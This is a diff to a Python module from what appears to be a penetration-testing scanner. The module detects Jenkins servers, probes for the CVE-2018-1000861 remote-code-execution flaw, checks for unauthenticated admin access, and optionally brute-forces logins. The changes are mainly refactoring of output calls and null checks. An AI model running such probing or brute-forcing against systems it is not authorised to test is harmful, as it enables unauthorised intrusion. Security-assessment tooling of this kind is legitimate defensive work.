@@ -24,7 +24,7 @@ class Module:
     name = 'Jenkins'
     description = 'Discover and exploit Jenkins (default password, CVE-2018-1000861)'
 
-    def run(self, target, args, useragent, proxy, timeout):
+    def run(self, target, args, useragent, proxy, timeout, safe):
         http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)
 
         # Checking CVE-2018-1000861
@@ -38,8 +38,8 @@ class Module:
 }""",
         }
         res = http.get(exploit_url, params=payload)
-        if res['code'] in [200] and 'jetty' in res['server'].lower():
-            Output.write({'target': http.url(target['path']), 'message': 'Jenkins RCE (CVE-2018-1000861)'})
+        if res and res['code'] in [200] and 'jetty' in res['server'].lower():
+            Output.vuln({'target': http.url(target['path']), 'message': 'Jenkins RCE (CVE-2018-1000861)'})
 
             vuln_info = {
                 'hostname': target['hostname'],
@@ -56,7 +56,7 @@ class Module:
 
             res = http.get(url)
 
-            if res['code'] in [200,403] and ('jenkins' in res['title'].lower() and not '/jenkins' in res['title'].lower() or 'X-Jenkins' in res['headers']):
+            if res and res['code'] in [200,403] and ('jenkins' in res['title'].lower() and not '/jenkins' in res['title'].lower() or 'X-Jenkins' in res['headers']):
                 http_info = {
                     'hostname': target['hostname'],
                     'port': target['port'],
@@ -83,7 +83,7 @@ class Module:
                 else:
                     version = 'Unknown'
 
-                Output.write({'target': http.url(url), 'message': 'Jenkins application, version %s' % version})
+                Output.highlight({'target': http.url(url), 'message': 'Jenkins application, version %s' % version})
 
                 manage_url = os.path.join(url, 'manage')
                 login_url = os.path.join(url, 'login')
@@ -91,7 +91,7 @@ class Module:
                 data = http.get(manage_url)
 
                 if data['code'] in [200] and not "content='1;url=%s" % login_url in data['html']:
-                    Output.write({'target': http.url(url), 'message': 'Jenkins application accessible without authentication'})
+                    Output.vuln({'target': http.url(url), 'message': 'Jenkins application accessible without authentication'})
 
                     vuln_info = {
                         'hostname': target['hostname'],
@@ -104,7 +104,7 @@ class Module:
                     DB.insert_vulnerability(vuln_info)
                 else:
                     if args['bruteforce']:
-                        Output.write({'target': http.url(login_url), 'message': 'Starting bruteforce...'})
+                        Output.highlight({'target': http.url(login_url), 'message': 'Starting bruteforce...'})
                         for cred in gen_bruteforce_creds(args['bruteforce'], creds):
                             username, password = cred.split(':')
 
@@ -146,7 +146,7 @@ class Module:
                             if after_auth_form != None:
                                 continue
 
-                            Output.write({'target': http.url(url), 'message': 'Authentication success to Jenkins with login %s and password %s' % (username, password)})
+                            Output.success({'target': http.url(url), 'message': 'Authentication success to Jenkins with login %s and password %s' % (username, password)})
 
                             cred_info = {
                                 'hostname': target['hostname'],
